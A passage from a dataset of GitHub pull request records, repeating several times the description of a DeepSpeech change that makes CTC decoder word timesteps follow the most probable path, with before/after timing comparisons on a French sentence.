 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1f89bef5f0f58c1d348b3fa534694481623b6be7,PR #3279 - avoid unnecessary copies of timesteps vectors
561,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec55597412da8b43d079b650811321b82d60c588,PR #3279 - use a tree structure to store timesteps
562,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3a49344ccbaf0e6a56367ead15288247305f6287,PR #3279 - use an object pool to store timesteps tree nodes
563,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

